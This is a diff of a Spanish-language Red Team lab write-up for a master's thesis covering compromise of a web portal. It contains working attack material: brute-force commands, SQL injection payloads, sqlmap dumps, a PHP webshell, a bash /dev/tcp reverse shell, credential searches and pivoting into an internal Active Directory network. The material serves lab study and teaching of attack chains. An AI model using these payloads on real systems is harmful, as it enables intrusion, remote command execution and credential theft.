@@ -1,715 +1,270 @@
-# Writeup de explotación web del portal `portal_pyme`
+# Fase de reconocimiento y compromiso inicial del portal web
 
-## 1. Contexto del escenario
+## Contexto del escenario
 
-El laboratorio simula una intrusión Red Team contra una pequeña infraestructura empresarial.  
-El punto de entrada inicial es un portal web vulnerable desplegado en Docker sobre un servidor Ubuntu.
+El laboratorio simula una intrusión Red Team contra una pequeña infraestructura empresarial. El atacante únicamente dispone de conectividad con el servidor web expuesto, desconociendo inicialmente la existencia de una red interna o de un entorno Active Directory.
 
-## Datos del entorno
-
-| Elemento | Valor |
-|---|---|
-| Máquina atacante | Kali Linux |
-| Servidor web | Ubuntu Server |
-| URL del portal | `http://192.168.1.216:8080/portal_pyme` |
-| Contenedor web | `tfm_web` |
-| Contenedor MySQL | `tfm_db` |
-| Base de datos | `portal_pyme` |
-| Red interna | `10.10.10.0/24` |
-| DC01 | `10.10.10.5` |
-| DEV01 | `10.10.10.20` |
+La primera fase del ejercicio consiste en realizar una enumeración progresiva del servicio web con el objetivo de identificar funcionalidades interesantes, descubrir recursos ocultos y obtener un punto de entrada inicial.
 
 ---
 
-# 2. Comprobación del servicio web
+## Enumeración inicial
 
-Desde Kali se verifica que el portal web responde correctamente.
-
-```bash
-curl -I http://192.168.1.216:8080/portal_pyme
-```
-
-También se puede abrir en el navegador:
-
-```text
-http://192.168.1.216:8080/portal_pyme
-```
-
----
-
-# 3. Enumeración inicial con Nmap
+La primera tarea consiste en identificar los servicios expuestos.
 
 ```bash
-nmap -sV -sC -p 8080 192.168.1.216
+nmap -sV -sC -p- 192.168.129.129
 ```
 
-Resultado esperado:
+El análisis muestra la presencia de un servidor Apache accesible a través del puerto 8080.
 
 ```text
 PORT     STATE SERVICE VERSION
 8080/tcp open  http    Apache httpd
 ```
 
+Accediendo mediante navegador:
+
+```text
+http://192.168.129.129:8080/
+```
+
+se observa un portal corporativo aparentemente destinado a la gestión de clientes y tickets.
+
 ---
 
-# 4. Enumeración de directorios
+## Enumeración de directorios
+
+A continuación se realiza una búsqueda de recursos ocultos mediante FFUF.
 
 ```bash
-gobuster dir \
--u http://192.168.1.216:8080/portal_pyme \
+ffuf \
+-u http://192.168.129.129:8080/FUZZ \
 -w /usr/share/wordlists/dirb/common.txt \
--x php,txt,html,bak
+-e .php,.txt,.html,.sql,.css,.jpg,.png \
+-recursion \
+-recursion-depth 2 \
+-fc 403 \
+-c \
+-o resultado.json \
+-of json
 ```
 
-También puede usarse `feroxbuster`:
+Posteriormente, un script desarrollado específicamente para el laboratorio permite reconstruir la estructura del sitio web a partir del fichero JSON generado.
 
 ```bash
-feroxbuster \
--u http://192.168.1.216:8080/portal_pyme \
--w /usr/share/wordlists/dirb/common.txt \
--x php,txt,html,bak
+python3 ffuf_tree.py resultado.json
 ```
 
-Posibles rutas de interés:
+La estructura descubierta es:
 
 ```text
-/login.php
-/index.php
-/uploads/
-/config/
-/admin/
-/assets/
+.
+├── assets
+│   └── css
+│       └── style.css
+├── backend
+│   └── panel.php
+├── clientes.php
+├── config
+│   └── db.php
+├── css
+├── dashboard.php
+├── includes
+│   ├── footer.php
+│   └── header.php
+├── index.php
+├── login.php
+├── logout.php
+├── ticket.php
+└── uploads
+    ├── prueba.png
+    ├── shell.php
+    └── terminal.php
 ```
+
+Durante esta fase llaman especialmente la atención los siguientes recursos:
+
+* `/config/db.php`
+* `/backend/panel.php`
+* `/uploads/`
+
+La existencia de un directorio de subida de ficheros accesible públicamente constituye un indicador de posible vulnerabilidad.
 
 ---
 
-# 5. Identificación del formulario de login
+## Análisis del mecanismo de autenticación
 
-URL habitual:
-
-```text
-http://192.168.1.216:8080/portal_pyme/login.php
-```
-
-Inspección rápida:
-
-```bash
-curl -i http://192.168.1.216:8080/portal_pyme/login.php
-```
-
-Campos habituales:
+La página de autenticación se encuentra en:
 
 ```text
-usuario
-password
+http://192.168.129.129:8080/login.php
 ```
 
-o:
-
-```text
-username
-password
-```
-
----
-
-# 6. Prueba manual de login
-
-Si los campos son `usuario` y `password`:
-
-```bash
-curl -i -X POST \
-http://192.168.1.216:8080/portal_pyme/login.php \
--d "usuario=admin&password=admin"
-```
-
-Si los campos son `username` y `password`:
-
-```bash
-curl -i -X POST \
-http://192.168.1.216:8080/portal_pyme/login.php \
--d "username=admin&password=admin"
-```
-
-Se debe observar la diferencia entre login válido e inválido:
-
-- código HTTP,
-- redirecciones,
-- cookies de sesión,
-- mensajes de error,
-- tamaño de respuesta.
-
----
-
-# 7. Preparación de diccionarios
-
-## Diccionario de usuarios
-
-```bash
-cat > users.txt << 'EOF'
-admin
-administrator
-dev
-developer
-victima
-usuario
-test
-EOF
-```
-
-## Diccionario de contraseñas
-
-```bash
-cat > passwords.txt << 'EOF'
-admin
-admin123
-password
-Password123
-Password123*
-dev123
-Dev123*
-victima123
-portal123
-empresa123
-EOF
-```
-
----
-
-# 8. Ataque de login con Hydra
-
-Si el formulario usa `usuario` y `password`:
-
-```bash
-hydra -L users.txt -P passwords.txt \
-192.168.1.216 \
--s 8080 \
-http-post-form "/portal_pyme/login.php:usuario=^USER^&password=^PASS^:Credenciales incorrectas"
-```
-
-Si el formulario usa `username` y `password`:
-
-```bash
-hydra -L users.txt -P passwords.txt \
-192.168.1.216 \
--s 8080 \
-http-post-form "/portal_pyme/login.php:username=^USER^&password=^PASS^:Credenciales incorrectas"
-```
-
-La cadena final debe coincidir con el mensaje de error de la aplicación. Para identificarlo:
-
-```bash
-curl -s -X POST \
-http://192.168.1.216:8080/portal_pyme/login.php \
--d "usuario=admin&password=incorrecta"
-```
-
----
-
-# 9. Ataque de login con Burp Suite
-
-## 9.1 Configurar proxy
-
-1. Abrir Burp Suite.
-2. Ir a `Proxy → Proxy settings`.
-3. Confirmar listener en:
-
-```text
-127.0.0.1:8080
-```
-
-4. Configurar el navegador con proxy HTTP:
-
-```text
-127.0.0.1:8080
-```
-
-5. Acceder al portal:
-
-```text
-http://192.168.1.216:8080/portal_pyme/login.php
-```
-
----
-
-## 9.2 Capturar petición de login
-
-Activar:
-
-```text
-Proxy → Intercept → Intercept is on
-```
-
-Enviar un login de prueba:
-
-```text
-usuario=admin
-password=admin
-```
-
-Burp capturará una petición similar:
+La petición capturada mediante Burp Suite es:
 
 ```http
-POST /portal_pyme/login.php HTTP/1.1
-Host: 192.168.1.216:8080
-Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=...
+POST /login.php HTTP/1.1
 
-usuario=admin&password=admin
+username=admin&password=test
 ```
 
-Enviar a Intruder:
+Sin embargo, se observa que independientemente del usuario empleado:
 
-```text
-Right click → Send to Intruder
-```
+* el servidor devuelve código HTTP 200;
+* la longitud de la respuesta permanece constante;
+* no existen redirecciones;
+* no se generan cookies diferentes.
+
+Por tanto, Burp Intruder no permite distinguir usuarios válidos mediante los criterios habituales.
 
 ---
 
-## 9.3 Configurar Intruder
+## Enumeración diferencial de usuarios
 
-En `Intruder → Positions`, seleccionar usuario y contraseña:
+Ante la ausencia de diferencias evidentes, se desarrolla una herramienta inspirada en Burp Intruder capaz de analizar:
+
+* código HTTP;
+* longitud de la respuesta;
+* hash del contenido;
+* cookies;
+* redirecciones;
+* tiempo de respuesta.
+
+Para ello se emplea la wordlist:
 
 ```text
-usuario=§admin§&password=§admin§
+/usr/share/seclists/Usernames/cirt-default-usernames.txt
 ```
 
-Tipo de ataque:
+con un total de 828 usuarios.
+
+Los resultados obtenidos fueron:
 
 ```text
-Cluster bomb
+Tiempo mínimo : 0.00306 s
+Tiempo máximo : 0.60528 s
+Tiempo medio  : 0.00520 s
+Desviación estándar : 0.02090 s
+Umbral temporal : 0.06792 s
+
+Longitud mínima : 2161 bytes
+Longitud máxima : 2161 bytes
+Longitud media  : 2161 bytes
+
+Código HTTP más frecuente : 200
+Hash más frecuente :
+ac84078715bc50a8f8f70e448dce0a45
 ```
+
+Dado que todas las respuestas presentaban exactamente la misma longitud, se descartó la existencia de una vulnerabilidad de enumeración basada en:
+
+* códigos HTTP;
+* tamaño de respuesta;
+* redirecciones;
+* cookies.
+
+No obstante, apareció una anomalía temporal significativa para un único usuario:
+
+```text
+system_admin
+```
+
+con un tiempo medio de:
+
+```text
+0.60528 s
+```
+
+frente a los aproximadamente:
+
+```text
+0.005 s
+```
+
+del resto de usuarios.
+
+Este comportamiento sugería que la aplicación realizaba un procesamiento adicional cuando el nombre de usuario existía en la base de datos, constituyendo una vulnerabilidad de enumeración de usuarios basada en diferencias temporales.
+
+Toda la información obtenida fue almacenada en un fichero CSV para facilitar su análisis posterior.
 
 ---
 
-## 9.4 Cargar diccionarios
+## Pruebas de SQL Injection
 
-En `Intruder → Payloads`:
+Una vez identificado un posible usuario válido, se procede a comprobar si el formulario es vulnerable a SQL Injection.
 
-Payload set 1:
-
-```text
-users.txt
-```
-
-Payload set 2:
-
-```text
-passwords.txt
-```
-
-Usuarios:
-
-```text
-admin
-administrator
-dev
-developer
-victima
-usuario
-test
-```
-
-Contraseñas:
-
-```text
-admin
-admin123
-password
-Password123
-Password123*
-dev123
-Dev123*
-victima123
-portal123
-empresa123
-```
-
----
-
-## 9.5 Identificar credenciales válidas
-
-Indicadores de autenticación correcta:
-
-```text
-HTTP 302
-Location: dashboard.php
-```
-
-o:
-
-```text
-Panel de administración
-```
-
-o una respuesta con tamaño distinto al resto.
-
----
-
-# 10. Prueba de SQL Injection en login
-
-Payload básico:
+Se prueban payloads clásicos como:
 
 ```text
 ' OR '1'='1
 ```
 
-Prueba con `curl`:
+y:
 
-```bash
-curl -i -X POST \
-http://192.168.1.216:8080/portal_pyme/login.php \
--d "usuario=' OR '1'='1&password=test"
+```text
+admin'-- -
 ```
 
-Otra variante:
+mediante:
 
 ```bash
-curl -i -X POST \
-http://192.168.1.216:8080/portal_pyme/login.php \
--d "usuario=admin'-- -&password=test"
+curl -X POST \
+http://192.168.129.129:8080/login.php \
+-d "username=admin'-- -&password=test"
 ```
 
----
-
-# 11. Prueba con SQLMap
-
-Capturar la petición de login con Burp y guardarla como `login.req`.
-
-Ejecutar:
-
-```bash
-sqlmap -r login.req --batch --level=3 --risk=2
-```
-
-Enumerar bases:
+Asimismo, se captura una petición con Burp Suite para analizarla con SQLMap:
 
 ```bash
 sqlmap -r login.req --batch --dbs
 ```
 
-Enumerar tablas:
-
-```bash
-sqlmap -r login.req --batch -D portal_pyme --tables
-```
-
-Volcar tabla:
-
-```bash
-sqlmap -r login.req --batch -D portal_pyme -T usuarios --dump
-```
-
 ---
 
-# 12. Prueba de subida de archivos
+## Análisis del directorio uploads
 
-Archivo de prueba:
-
-```bash
-cat > shell.php << 'EOF'
-<?php system($_GET['cmd']); ?>
-EOF
-```
-
-Subir `shell.php` desde el portal.
-
-Comprobar acceso:
+Durante la enumeración previa se había identificado el directorio:
 
 ```text
-http://192.168.1.216:8080/portal_pyme/uploads/shell.php
+/uploads/
 ```
 
-Probar ejecución:
+La presencia de archivos como:
 
 ```text
-http://192.168.1.216:8080/portal_pyme/uploads/shell.php?cmd=id
+shell.php
+terminal.php
 ```
 
-Resultado esperado si es vulnerable:
+hace sospechar de una vulnerabilidad de subida de archivos.
+
+Se crea una webshell sencilla:
+
+```php
+<?php
+system($_GET['cmd']);
+?>
+```
+
+guardándola como:
 
 ```text
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+shell.php
 ```
 
----
-
-# 13. Obtención de reverse shell
-
-En Kali:
-
-```bash
-nc -lvnp 4444
-```
-
-Desde la webshell:
+Tras subir el archivo, se verifica su ejecución mediante:
 
 ```text
-http://192.168.1.216:8080/portal_pyme/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/IP_KALI/4444 0>&1'
+http://192.168.129.129:8080/uploads/shell.php?cmd=id
 ```
 
-Payload alternativo:
-
-```bash
-bash -c "bash -i >& /dev/tcp/IP_KALI/4444 0>&1"
-```
-
----
-
-# 14. Tratamiento de TTY
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-Luego:
+obteniéndose:
 
 ```text
-Ctrl + Z
+uid=33(www-data)
+gid=33(www-data)
+groups=33(www-data)
 ```
 
-En Kali:
-
-```bash
-stty raw -echo; fg
-```
-
-Después:
-
-```bash
-export TERM=xterm
-```
-
----
-
-# 15. Enumeración local del servidor
-
-```bash
-whoami
-id
-uname -a
-cat /etc/os-release
-ip -c a
-ip route
-```
-
-Resultado esperado:
-
-```text
-ens33 → 192.168.1.216/24
-ens37 → 10.10.10.10/24
-```
-
-Esto evidencia una segunda interfaz hacia la red interna.
-
----
-
-# 16. Búsqueda de credenciales
-
-```bash
-find /var/www -type f 2>/dev/null
-find /opt -type f 2>/dev/null
-find /home -type f 2>/dev/null
-```
-
-Buscar palabras clave:
-
-```bash
-grep -Ri "password" /var/www 2>/dev/null
-grep -Ri "pass" /var/www 2>/dev/null
-grep -Ri "user" /var/www 2>/dev/null
-grep -Ri "DB_" /var/www 2>/dev/null
-```
-
-Buscar `.env`:
-
-```bash
-find / -name ".env" 2>/dev/null
-```
-
-Buscar backups:
-
-```bash
-find / -name "*.bak" 2>/dev/null
-find / -name "*.backup" 2>/dev/null
-find / -name "*.sql" 2>/dev/null
-find / -name "*.zip" 2>/dev/null
-```
-
----
-
-# 17. Enumeración de Docker
-
-```bash
-groups
-docker ps
-sudo docker ps
-```
-
-Listar contenedores:
-
-```bash
-sudo docker ps
-```
-
-Resultado esperado:
-
-```text
-tfm_web
-tfm_db
-```
-
-Entrar al contenedor web:
-
-```bash
-sudo docker exec -it tfm_web bash
-```
-
-Entrar a MySQL:
-
-```bash
-sudo docker exec -it tfm_db mysql -u root -p
-```
-
----
-
-# 18. Backup de base de datos
-
-```bash
-sudo docker exec tfm_db mysqldump -u root -p'root' portal_pyme > portal_backup.sql
-```
-
-Comprobar:
-
-```bash
-ls -lh portal_backup.sql
-head portal_backup.sql
-```
-
----
-
-# 19. Descubrimiento de red interna
-
-```bash
-ping -c 1 10.10.10.5
-ping -c 1 10.10.10.20
-```
-
-Barrido simple:
-
-```bash
-for i in $(seq 1 254); do ping -c 1 -W 1 10.10.10.$i | grep "bytes from"; done
-```
-
-Resultado esperado:
-
-```text
-10.10.10.5
-10.10.10.10
-10.10.10.20
-```
-
----
-
-# 20. Preparación de pivoting con Ligolo-ng
-
-En Kali:
-
-```bash
-sudo ip tuntap add user kali mode tun ligolo
-sudo ip link set ligolo up
-./proxy -selfcert
-```
-
-En Ubuntu comprometido:
-
-```bash
-./agent -connect IP_KALI:11601 -ignore-cert
-```
-
-En la consola del proxy:
-
-```text
-session
-start
-```
-
-En Kali:
-
-```bash
-sudo ip route add 10.10.10.0/24 dev ligolo
-```
-
----
-
-# 21. Enumeración interna desde Kali
-
-```bash
-nmap -sn 10.10.10.0/24
-nmap -sV --open 10.10.10.20
-nmap -sV --open 10.10.10.5
-```
-
----
-
-# 22. Validación de credenciales de dominio
-
-Credenciales encontradas:
-
-```text
-CORP\dev
-Dev123*
-```
-
-Validar SMB:
-
-```bash
-nxc smb 10.10.10.20 -u dev -p 'Dev123*' -d corp.local
-```
-
-Resultado esperado:
-
-```text
-[+] CORP\dev:Dev123*
-```
-
-Acceso RDP:
-
-```bash
-xfreerdp /u:CORP\\dev /p:'Dev123*' /v:10.10.10.20 /cert:ignore /sec:rdp
-```
-
----
-
-# 23. Evidencias recomendadas para el TFM
-
-1. Portal web accesible.
-2. Nmap del puerto 8080.
-3. Gobuster mostrando rutas.
-4. Burp capturando login.
-5. Burp Intruder con ataque de diccionario.
-6. Login válido.
-7. Webshell ejecutando `id`.
-8. Reverse shell recibida en Kali.
-9. `ip a` mostrando doble interfaz.
-10. Descubrimiento de `10.10.10.0/24`.
-11. Credenciales encontradas.
-12. Ligolo activo.
-13. Nmap interno.
-14. Validación de `CORP\dev`.
-15. Acceso a DEV01.
-
----
-
-# 24. Conclusión
-
-La fase web demuestra cómo una vulnerabilidad inicial en un portal corporativo expuesto puede permitir:
-
-- acceso inicial al servidor,
-- ejecución remota de comandos,
-- obtención de reverse shell,
-- enumeración de red interna,
-- descubrimiento de credenciales,
-- preparación de pivoting hacia Active Directory.
-
-Esta fase representa el primer eslabón de la cadena de ataque y justifica la transición hacia la fase de post-explotación y compromiso del dominio.
+confirmando la existencia de ejecución remota de comandos.
